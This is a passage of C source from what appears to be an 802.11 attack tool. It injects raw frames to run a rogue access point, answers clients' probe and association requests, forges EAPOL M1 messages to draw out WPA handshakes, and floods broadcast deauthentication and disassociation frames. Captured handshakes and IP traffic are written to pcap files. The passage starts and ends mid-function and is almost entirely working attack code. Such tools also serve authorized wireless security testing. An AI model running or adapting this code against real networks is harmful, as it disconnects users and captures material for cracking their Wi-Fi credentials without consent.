static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_REASSOC_RESP;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->duration = 0x013a;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM], &associationid, ASSOCIATIONID_SIZE);
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE], &associationresponsedata, ASSOCIATIONRESPONSE_SIZE);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +ASSOCIATIONID_SIZE +ASSOCIATIONRESPONSE_SIZE));
return;
}
/*===========================================================================*/
static void send_m1()
{
int retw;
mac_t *macf;

const uint8_t anoncewpa2data[] =
{
0x88, 0x02, 0x3a, 0x01,
0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
0x21, 0x22, 0x23, 0x24, 0x25, 0x26,
0x00, 0x00, 0x06, 0x00,
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02,
0x03,
0x00, 0x5f,
0x02,
0x00, 0x8a,
0x00, 0x10,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7, 0x00,
0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79, 0x09,
0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd, 0xb9,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00
};
#define ANONCEWPA2_SIZE sizeof(anoncewpa2data)

static uint8_t packetout[HDRRT_SIZE +ANONCEWPA2_SIZE +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +ANONCEWPA2_SIZE);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
memcpy(&packetout[HDRRT_SIZE], &anoncewpa2data, ANONCEWPA2_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
memcpy(macf->addr1, networkliste->mac_sta, 6);
memcpy(macf->addr2, networkliste->mac_ap, 6);
memcpy(macf->addr3, networkliste->mac_ap, 6);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +ANONCEWPA2_SIZE));
return;
}
/*===========================================================================*/
static void send_m1_org()
{
int retw;
uint16_t eapollen;

const uint8_t myrcanonce[] =
{
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf7, 0x00,
0x68, 0x20, 0x09, 0xe2, 0x1f, 0x0e, 0xbc, 0xe5, 0x62, 0xb9, 0x06, 0x5b, 0x54, 0x89, 0x79, 0x09,
0x9a, 0x65, 0x52, 0x86, 0xc0, 0x77, 0xea, 0x28, 0x2f, 0x6a, 0xaf, 0x13, 0x8e, 0x50, 0xcd, 0xb9,
};

uint8_t packetout[HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +256];

if(respondflag == true)
	{
	return;
	}
if(checknetwork_m1org() == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +98);
eapollen = ntohs(eap->len);
if(eapollen > 256)
	{
	eapollen = 95;
	}
if(qosflag ==false)
	{
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	memcpy(&packetout[HDRRT_SIZE], packet_ptr, +MAC_SIZE_NORM +LLC_SIZE +EAPAUTH_SIZE +eapollen);
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +EAPAUTH_SIZE +5], &myrcanonce, 40);
	CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +LLC_SIZE +EAPAUTH_SIZE +eapollen));
	}
else
	{
	memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
	memcpy(&packetout[HDRRT_SIZE], packet_ptr, +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +eapollen);
	memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +5], &myrcanonce, 40);
	CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +eapollen));
	}
return;
}
/*===========================================================================*/
static void send_requestidentity()
{
int retw;
mac_t *macf;

const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x02, 0x00, 0x00, 0x05, 0x01, 0x80, 0x00, 0x05, 0x01
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1];

if(respondflag == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_DATA;
macf->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->from_ds = 1;
macf->duration = 0x002c;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE));
return;
}
/*===========================================================================*/
static void send_disassociation_to_sta(uint8_t reason)
{
static int retw;
static mac_t *macf;
static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +2 +1];

if(deauthflag == true)
	{
	return;
	}
if(checknetwork_m12() == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macf->addr1, mac_ptr->addr2, 6);
memcpy(macf->addr2, mac_ptr->addr1, 6);
memcpy(macf->addr3, mac_ptr->addr1, 6);
macf->duration = 0x013a;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +2));
return;
}
/*===========================================================================*/
static void addnetwork_m1()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return;
		}
	if((memcmp(mac_ptr->addr2, zeiger->mac_ap, 6) == 0) && (memcmp(mac_ptr->addr1, zeiger->mac_sta, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		zeiger->status |= 2;
		qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
		return;
		}
	zeiger++;
	}
return;
}
/*===========================================================================*/
static bool addnetwork_m2()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		return false;
		}
	if((memcmp(mac_ptr->addr1, zeiger->mac_ap, 6) == 0) && (memcmp(mac_ptr->addr2, zeiger->mac_sta, 6) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		if(zeiger->status == 7)
			{
			qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
			return false;
			}
		zeiger->status |= 4;
		qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
		return true;
		}
	zeiger++;
	}
return false;
}
/*===========================================================================*/
static void process80211networkauthentication()
{
uint16_t keyinfo;
uint64_t replaycount;

if(eap->type == 3)
	{
	keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
	if(keyinfo == 1)
		{
		replaycount = byte_swap_64(wpak->replaycount);
		#ifdef BIG_ENDIAN_HOST
		replaycount = byte_swap_64(wpak->replaycount);
		#endif
		if((replaycount == MYREPLAYCOUNT) && (memcmp(wpak->nonce, &mynonce, 32) == 0))
			{
			addnetwork_m1();
			}
		else
			{
			send_m1_org(qosflag);
			}
		}
	if(keyinfo == 2)
		{
		replaycount = byte_swap_64(wpak->replaycount);
		#ifdef BIG_ENDIAN_HOST
		replaycount = byte_swap_64(wpak->replaycount);
		#endif
		if(replaycount == MYREPLAYCOUNT)
			{
			if(wantstatusflag == true)
				{
				if(addnetwork_m2() == true)
					{
					printnetwork("[HANDSHAKE]");
					}
				}
			}
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		authenticationflag = 0;
		}
	else if(keyinfo == 4)
		{
		send_disassociation_to_sta(WLAN_REASON_DISASSOC_AP_BUSY);
		send_disassociation_to_sta(WLAN_REASON_DISASSOC_AP_BUSY);
		}
	return;
	}
else if(eap->type == 0)
	{
	return;
	}
else if(eap->type == 1)
	{
	send_acknowledgement(mac_ptr->addr2);
	send_requestidentity(mac_ptr->addr2, mac_ptr->addr1);
	return;
	}
else if(eap->type == 5)
	{
	return;
	}
return;
}
/*===========================================================================*/
static void writemacap()
{
macessidlist_t *zeiger;
int c;
int retw;

zeiger = macapessidliste;
for(c = 0; c < MACAPESSIDLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->addr, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr, mac_ptr->addr2, 6) == 0) && (zeiger->essid_len == essid_tag->len) && (memcmp(zeiger->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return;
		}
	zeiger++;
	}

zeiger->tv_sec = tv.tv_sec;
memcpy(zeiger->addr, mac_ptr->addr2, 6);
zeiger->essid_len = essid_tag->len;
memset(zeiger->essid, 0, 6);
memcpy(zeiger->essid, essid_tag->data, essid_tag->len);
CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
qsort(macapessidliste, MACAPESSIDLISTZEMAX , MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static void send_deauthentication_to_broadcast(uint8_t reason)
{
static int retw;
static mac_t *macf;
static uint8_t packetout[HDRRT_SIZE +MAC_SIZE_NORM +2 +1];

if(deauthflag == true)
	{
	return;
	}
if(checknetwork_broadcast() == true)
	{
	return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macf = (mac_t*)(packetout +HDRRT_SIZE);
macf->type = IEEE80211_FTYPE_MGMT;
macf->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macf->addr1, mac_ptr->addr1, 6);
memcpy(macf->addr2, mac_ptr->addr2, 6);
memcpy(macf->addr3, mac_ptr->addr3, 6);
macf->duration = 0x013a;
macf->sequence = mysequencenr++ << 4;
if(mysequencenr >= 4096)
	{
	mysequencenr = 0;
	}
packetout[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
CHK_ERR(retw = write(fd_socket, packetout, HDRRT_SIZE +MAC_SIZE_NORM +2));
return;
}
/*===========================================================================*/
static void writemacap_deauth()
{
macessidlist_t *zeiger;
int c;
int retw;

zeiger = macapessidliste;
for(c = 0; c < MACAPESSIDLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->addr, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr, mac_ptr->addr2, 6) == 0) && (zeiger->essid_len == essid_tag->len) && (memcmp(zeiger->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		zeiger->status += 1;
		if(authenticationflag >= 1)
			{
			return;
			}
		if(zeiger->status > 10)
			{
			send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
			send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
			send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
			send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
			zeiger->status = 0;
			}
		return;
		}
	zeiger++;
	}

zeiger->tv_sec = tv.tv_sec;
zeiger->status = 0;
memcpy(zeiger->addr, mac_ptr->addr2, 6);
zeiger->essid_len = essid_tag->len;
memset(zeiger->essid, 0, 6);
memcpy(zeiger->essid, essid_tag->data, essid_tag->len);
CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
send_deauthentication_to_broadcast(WLAN_REASON_UNSPECIFIED);
qsort(macapessidliste, MACAPESSIDLISTZEMAX , MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static void writemacsta()
{
macessidlist_t *zeiger;
int c;
int retw;

zeiger = macstaessidliste;
for(c = 0; c < MACSTAESSIDLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->addr, 6) == 0)
		{
		break;
		}
	if((memcmp(zeiger->addr, mac_ptr->addr2, 6) == 0) && (zeiger->essid_len == essid_tag->len) && (memcmp(zeiger->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		return;
		}
	zeiger++;
	}

zeiger->tv_sec = tv.tv_sec;
memcpy(zeiger->addr, mac_ptr->addr2, 6);
zeiger->essid_len = essid_tag->len;
memset(zeiger->essid, 0, 6);
memcpy(zeiger->essid, essid_tag->data, essid_tag->len);
CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
qsort(macstaessidliste, MACSTAESSIDLISTZEMAX , MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return;
}
/*===========================================================================*/
static ietag_t *getessidtag(uint8_t taglen, uint8_t *tagdata)
{
ietag_t *tagl;
tagl = (ietag_t*)tagdata;

while(0 < taglen)
	{
	if(tagl->id == TAG_SSID)
		{
		if((tagl->len == 0) || (tagl->len > 32))
			{
			return NULL;
			}
		if(tagl->data[0] == 0)
			{
			return NULL;
			}
		return tagl;
		}
	tagl = (ietag_t*)((uint8_t*)tagl +tagl->len +IETAG_SIZE);
	taglen -= tagl->len;
	}
return NULL;
}
/*===========================================================================*/
/*===========================================================================*/
static void handle_beacon()
{

essid_tag = (ietag_t*)getessidtag(caplen -MAC_SIZE_NORM -CAPABILITIESAP_SIZE, packet_ptr +MAC_SIZE_NORM +CAPABILITIESAP_SIZE);

if(essid_tag != NULL)
	{
	writemacap_deauth();
	}
return;
}
/*===========================================================================*/
static void handle_directedproberequest()
{
essid_tag = (ietag_t*)getessidtag(caplen -MAC_SIZE_NORM, packet_ptr +MAC_SIZE_NORM);
if(essid_tag == NULL)
	{
	return;
	}
send_directproberesponse();
writemacsta();
return;
}
/*===========================================================================*/
static uint8_t *getmac()
{
macessidlist_t *zeiger1;
macessidlist_t *zeiger2;
int c;

zeiger1 = macapessidliste;
for(c = 0; c < MACAPESSIDLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger1->addr, 6) == 0)
		{
		break;
		}
	if((zeiger1->essid_len == essid_tag->len) && (memcmp(zeiger1->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger1->tv_sec = tv.tv_sec;
		return zeiger1->addr;
		}
	zeiger1++;
	}

zeiger2 = macmyapessidliste;
for(c = 0; c < MACAPESSIDLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger2->addr, 6) == 0)
		{
		break;
		}
	if((zeiger2->essid_len == essid_tag->len) && (memcmp(zeiger2->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger2->tv_sec = tv.tv_sec;
		return zeiger2->addr;
		}
	zeiger2++;
	}
zeiger2->tv_sec = tv.tv_sec;
mac_myap[5] = mynicap & 0xff;
mac_myap[4] = (mynicap >> 8) & 0xff;
mac_myap[3] = (mynicap >> 16) & 0xff;
mynicap++;
memcpy(zeiger2->addr, &mac_myap, 6);
memset(zeiger2->essid, 0, 32);
zeiger2->essid_len = essid_tag->len;
memcpy(zeiger2->essid, essid_tag->data, essid_tag->len);
qsort(macmyapessidliste, MACMYAPESSIDLISTZEMAX , MACESSIDLIST_SIZE, sort_macessidlist_by_time);
return macmyapessidliste->addr;
}
/*===========================================================================*/
static void handle_undirectedproberequest()
{
essid_tag = (ietag_t*)getessidtag(caplen-MAC_SIZE_NORM, packet_ptr +MAC_SIZE_NORM);
send_acknowledgement();
if(essid_tag == NULL)
	{
	return;
	}
nextmacap = getmac();
send_nextdirectproberesponse();
writemacsta();
return;
}
/*===========================================================================*/
void handle_proberesponse()
{
essid_tag = (ietag_t*)getessidtag(caplen -MAC_SIZE_NORM -CAPABILITIESAP_SIZE, packet_ptr +MAC_SIZE_NORM +CAPABILITIESAP_SIZE);
if(essid_tag != NULL)
	{
	writemacap();
	}
return;
}
/*===========================================================================*/
void addnetwork()
{
networklist_t *zeiger;
int c;

zeiger = networkliste;
for(c = 0; c < NETWORKLISTZEMAX -1; c++)
	{
	if(memcmp(&mac_null, zeiger->mac_ap, 6) == 0)
		{
		break;
		}
	if((memcmp(mac_ptr->addr1, zeiger->mac_ap, 6) == 0) && (memcmp(mac_ptr->addr2, zeiger->mac_sta, 6) == 0) && (zeiger->essid_len == essid_tag->len) && (memcmp(zeiger->essid, essid_tag->data, essid_tag->len) == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		zeiger->status |= 1;
		qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
		return;
		}
	if((memcmp(mac_ptr->addr1, zeiger->mac_ap, 6) == 0) && (memcmp(mac_ptr->addr2, zeiger->mac_sta, 6) == 0) && (zeiger->essid_len == 0) && (zeiger->essid[0] == 0))
		{
		zeiger->tv_sec = tv.tv_sec;
		zeiger->status |= 1;
		memset(zeiger->essid, 0, 32);
		zeiger->essid_len = essid_tag->len;
		memcpy(zeiger->essid, essid_tag->data, essid_tag->len);
		qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
		return;
		}
	zeiger++;
	}
zeiger->tv_sec = tv.tv_sec;
zeiger->status = 1;
memcpy(zeiger->mac_ap, mac_ptr->addr1, 6);
memcpy(zeiger->mac_sta, mac_ptr->addr2, 6);
memset(zeiger->essid, 0, 32);
zeiger->essid_len = essid_tag->len;
memcpy(zeiger->essid, essid_tag->data, essid_tag->len);
qsort(networkliste, NETWORKLISTZEMAX , NETWORKLIST_SIZE, sort_networklist_by_time);
}
/*===========================================================================*/
void handle_association()
{
int retw;

essid_tag = (ietag_t*)getessidtag(caplen -MAC_SIZE_NORM -CAPABILITIESSTA_SIZE, packet_ptr +MAC_SIZE_NORM +CAPABILITIESSTA_SIZE);
if(essid_tag == NULL)
	{
	return;
	}
send_acknowledgement();
addnetwork();
send_associationresponse();
CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
return;
}
/*===========================================================================*/
void handle_reassociation()
{
int retw;

essid_tag = (ietag_t*)getessidtag(caplen -MAC_SIZE_NORM -CAPABILITIESRESTA_SIZE, packet_ptr +MAC_SIZE_NORM +CAPABILITIESRESTA_SIZE);
if(essid_tag == NULL)
	{
	return;
	}
send_acknowledgement();
addnetwork();
send_reassociationresponse();
CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
return;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static void globalclose()
{
if(fd_socket > 0)
	{
	close(fd_socket);
	}
if(fd_pcap > 0)
	{
	close(fd_pcap);
	}
if(fd_ippcap > 0)
	{
	close(fd_ippcap);
	}

free(macstaessidliste);

printf("\nterminated...\e[?25h\n");
if(poweroffflag == true)
	{
	if(system("poweroff") != 0)
		printf("can't power off\n");
	}
exit(EXIT_SUCCESS);
}
/*===========================================================================*/
#ifdef DOGPIOSUPPORT
static void *rpiflashthread()
{
while(1)
	{
	if(digitalRead(7) == 1)
		{
		digitalWrite(0, HIGH);
		wantstopflag = true;
		}
	if(wantstopflag == false)
		{
		digitalWrite(0, HIGH);
		delay (25);
		digitalWrite(0, LOW);
		delay (25);
		}
	sleep(5);
	}
return NULL;
}
#endif
/*===========================================================================*/
static bool set_channel()
{
static struct iwreq pwrq;

memset(&pwrq, 0, sizeof(pwrq));
strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ);
pwrq.u.freq.e = 0;
pwrq.u.freq.flags = IW_FREQ_FIXED;
pwrq.u.freq.m = channelscanlist[cpa];
if(ioctl(fd_socket, SIOCSIWFREQ, &pwrq) == -1)
	{
	return false;
	}
return true;
}
/*===========================================================================*/
static void *channelswitchthread()
{
while(1)
	{
	sleep(staytime);
	channelsetflag = true;
	}
return NULL;
}
/*===========================================================================*/
static void programmende(int signum)
{
if((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL))
	{
	wantstopflag = true;
	}
return;
}
/*===========================================================================*/
static void processpackets()
{
rth_t *rth;
fcs_t *fcs;
uint32_t crc;
unsigned long long int packetcount = 0;
int retw;
int fdnum;
fd_set readfds;

pkh = (pcaprec_hdr_t*)packetin;
printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
	"INTERFACE: %s\n"
	"MAC_AP...: %06x%06x (rogue access point)\n"
	"MAC_STA..: %06x%06x (rogue client)\n"
	"INFO.....: cha=%d, rcv=%llu, err=%d (refresh time depends on option -t)\r",
	interfacename, myouiap, mynicap, myouista, mynicsta, channelscanlist[cpa], packetcount, errorcount);
set_channel();
send_broadcastbeacon();
send_undirected_proberequest();
tvfd.tv_sec = 5;
tvfd.tv_usec = 0;
while(1)
	{
	if(wantstopflag == true)
		{
		globalclose();
		}
	if(channelsetflag == true)
		{
		cpa++;
		if(channelscanlist[cpa] == 0)
			{
			cpa = 0;
			}
		if(set_channel() == false)
			{
			errorcount++;
			}
		if(wantstatusflag == true)
			{
			printf("\33[2KINFO.....: cha=%d, rcv=%llu, err=%d\r", channelscanlist[cpa], packetcount, errorcount);
			}
		channelsetflag = false;
		send_broadcastbeacon();
		send_undirected_proberequest();
		}
	FD_ZERO(&readfds);
	FD_SET(fd_socket, &readfds);
	fdnum = select(fd_socket +1, &readfds, NULL, NULL, &tvfd);
	if(fdnum < 0)
		{
		errorcause = -1;
		globalclose();
		}
	else if(fdnum > 0 && FD_ISSET(fd_socket, &readfds))
		{
		caplen = read(fd_socket, &packetin[PCAPREC_SIZE], PCAP_SNAPLEN);
		if(ioctl(fd_socket, SIOCGSTAMP , &tv) < 0)
			{
			errorcount++;
			continue;
			}
		}
	else
		{
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		continue;
		}
	if(caplen <= 0)
		{
		errorcause = -1;
		globalclose();
		}
	if(caplen < (int)(RTH_SIZE +MAC_SIZE_ACK))
		{
		continue;
		}
	packetcount++;
	pkh->ts_sec = tv.tv_sec;
	pkh->ts_usec = tv.tv_usec;
	pkh->incl_len = caplen;
	pkh->orig_len = caplen;
	packet_ptr = &packetin[PCAPREC_SIZE];
	rth = (rth_t*)packet_ptr;
	#ifdef BIG_ENDIAN_HOST
	rth->it_len	= byte_swap_16(rth->it_len);
	rth->it_present	= byte_swap_32(rth->it_present);
	#endif
	packet_ptr += rth->it_len;
	caplen -= rth->it_len;
	fcs = (fcs_t*)(packet_ptr +caplen -4);
	#ifdef BIG_ENDIAN_HOST
	fcs->fcs	= byte_swap_32(fcs->fcs);
	#endif
	crc = fcscrc32check(packet_ptr, caplen -4);
	if(crc == fcs->fcs)
		{
		caplen -= 4;
		}
	mac_ptr = (mac_t*)packet_ptr;
	if((mac_ptr->from_ds == 1) && (mac_ptr->to_ds == 1))
		{
		continue;
		}
	if(mac_ptr->type == IEEE80211_FTYPE_MGMT)
		{
		if(mac_ptr->subtype == IEEE80211_STYPE_BEACON)
			{
			if(memcmp(&mac_myap, mac_ptr->addr2, 6) == 0)
				{
				continue;
				}
			handle_beacon();
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_PROBE_REQ)
			{
			if(memcmp(&mac_mysta, mac_ptr->addr2, 6) == 0)
				{
				continue;
				}
			if(memcmp(&mac_broadcast, mac_ptr->addr1, 6) == 0)
				{
				handle_undirectedproberequest();
				continue;
				}
			else
				{
				handle_directedproberequest();
				continue;
				}
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_PROBE_RESP)
			{
			handle_proberesponse();
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_AUTH)
			{ 
			authentication_ptr = (authf_t*)(packet_ptr +MAC_SIZE_NORM);
			if(authentication_ptr->sequence == 1)
				{
				send_acknowledgement();
				send_authenticationresponse();
				}
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_ASSOC_REQ)
			{ 
			handle_association();
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_ASSOC_RESP)
			{ 
			authenticationflag = 1;
			tvfd.tv_sec = 0;
			tvfd.tv_usec = 500000;
			CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_REASSOC_REQ)
			{ 
			handle_reassociation();
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_REASSOC_RESP)
			{ 
			authenticationflag = 1;
			tvfd.tv_sec = 0;
			tvfd.tv_usec = 500000;
			CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
			continue;
			}
		else if(mac_ptr->subtype == IEEE80211_STYPE_ACTION)
			{ 
			action_ptr = (actf_t*)(packet_ptr +MAC_SIZE_NORM);
			if((authenticationflag >= 1) && (action_ptr->categorycode == CAT_BLOCK_ACK) && (action_ptr->actioncode == ACT_ADD_BLOCK_ACK_REQ))
				{
				send_acknowledgement();
				send_m1();
				authenticationflag = 0;
				}
			continue;
			}
		continue;
		}
	else if(mac_ptr->type == IEEE80211_FTYPE_CTL)
		{
		if(IEEE80211_STYPE_ACK)
			{
			if(authenticationflag == 2)
				{
				send_m1();
				authenticationflag = 0;
				}
			if(authenticationflag == 1)
				{
				send_action_rmr();
				authenticationflag = 2;
				}
			continue;
			}
		continue;
		}
	else if (mac_ptr->type == IEEE80211_FTYPE_DATA)
		{
		if(mac_ptr->subtype == IEEE80211_STYPE_NULLFUNC)
			{
			if((authenticationflag > 1) && (mac_ptr->to_ds == 1) &&  (mac_ptr->power == 0))
				{
				send_acknowledgement();
				send_m1();
				authenticationflag = 3;
				}
			continue;
			}
		else if((mac_ptr->subtype == IEEE80211_STYPE_DATA) || (mac_ptr->subtype == IEEE80211_STYPE_DATA_CFACK) || (mac_ptr->subtype == IEEE80211_STYPE_DATA_CFPOLL) || (mac_ptr->subtype == IEEE80211_STYPE_DATA_CFACKPOLL))
			{
			if(caplen < (int)(MAC_SIZE_NORM +LLC_SIZE))
				{
				continue;
				}
			qosflag = false;
			llc = (llc_t*)(packet_ptr +MAC_SIZE_NORM);
			if(((ntohs(llc->type)) == LLC_TYPE_AUTH)&& (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
				if(caplen < (int)(MAC_SIZE_NORM +LLC_SIZE +EAPAUTH_SIZE))
					{
					continue;
					}
				eap = (eapauth_t*)(packet_ptr +MAC_SIZE_NORM +LLC_SIZE);
				wpak = (wpakey_t*)(packet_ptr +MAC_SIZE_NORM +LLC_SIZE +EAPAUTH_SIZE);
				process80211networkauthentication();
				CHK_ERR(retw = write(fd_pcap, packetin, pkh->incl_len +PCAPREC_SIZE));
				continue;
				}
			else if(((ntohs(llc->type)) == LLC_TYPE_IPV4) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
				if(fd_ippcap != 0)
					{
					CHK_ERR(retw = write(fd_ippcap, packetin, pkh->incl_len +PCAPREC_SIZE));
					}
				continue;
				}
			else if(((ntohs(llc->type)) == LLC_TYPE_IPV6) && (llc->dsap == LLC_SNAP) && (llc->ssap == LLC_SNAP))
				{
